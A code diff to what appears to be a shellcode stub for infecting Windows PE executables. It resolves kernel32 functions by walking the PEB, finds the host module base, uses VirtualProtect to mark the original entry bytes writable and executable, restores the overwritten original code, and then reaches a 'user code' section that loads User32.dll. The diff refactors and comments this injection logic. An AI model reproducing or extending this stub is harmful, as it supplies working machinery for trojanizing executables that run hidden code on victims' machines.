@@ -5,25 +5,26 @@ typedef long long QWORD;
 QWORD findDll(QWORD pebAddr ,char *name);
 DWORD getFuncAddress(char *funcName , QWORD k32Address);
 
-QWORD WINAPI entry(QWORD pebAddr ,QWORD baseAddress,QWORD offset,QWORD originEntry,char * originCode) {
+QWORD WINAPI entry(QWORD pebAddr ,QWORD offset,QWORD originEntry,char * originCode) {
 
+	// get kernel32.dll address
 	QWORD k32Address = 0 ;
 	char kernelStr[]="KERNEL32.DLL";
 	k32Address = findDll(pebAddr,kernelStr);
-
 	if (k32Address == 0 ){
 		char kernelBaseStr[]="KERNELBASE.DLL";
 		k32Address = findDll(pebAddr,kernelBaseStr);
-
 		if (k32Address == 0 ){
 			return 0 ;
 		}
 	}
 
+	// get LoadLibraryA function address
 	char loadLibStr[]="LoadLibraryA";
 	QWORD llibAddr = getFuncAddress(loadLibStr,k32Address);
 	llibAddr+=k32Address;
 
+    // get GetProcAddress function address
 	char getProcStr []="GetProcAddress";
 	QWORD gpAddr= getFuncAddress(getProcStr,k32Address);
 	gpAddr+=k32Address;
@@ -34,15 +35,24 @@ QWORD WINAPI entry(QWORD pebAddr ,QWORD baseAddress,QWORD offset,QWORD originEnt
 	typedef WINBASEAPI FARPROC (WINAPI *GetProcAddress)(_In_ HMODULE hModule,_In_ LPCSTR lpProcName);
 	GetProcAddress getProcAddress = (GetProcAddress)(gpAddr);
 
+	// get the programmer base address
+	QWORD baseAddress;
+	char getModuleStr[]="GetModuleHandleA";
+	QWORD mhAddr  = getProcAddress(k32Address,getModuleStr);
+    typedef QWORD (*GetModuleHandleA)( LPCWSTR lpModuleName);
+    GetModuleHandleA getModuleHandleA = (GetModuleHandleA)(mhAddr);
+    baseAddress= getModuleHandleA(NULL);
+
+    // restore the original PE file
 	typedef BOOL (WINAPI *VirtualProtect)(_In_  QWORD lpAddress,_In_  QWORD dwSize,_In_  DWORD flNewProtect,_Out_ QWORD lpflOldProtect);
 	char virtualProtectStr[] = "VirtualProtect";
 	QWORD vpAddr = getProcAddress(k32Address,virtualProtectStr);
 	VirtualProtect virtualProtect = (VirtualProtect)(vpAddr);
 	QWORD old;
 	virtualProtect(originEntry+baseAddress,5,0x40,&old);
-
 	recoverCode(originEntry+baseAddress,originCode);
 
+	// user code
 	char userStr[]="User32.dll";
 	HMODULE u32dll = loadLibraryA(userStr);
 
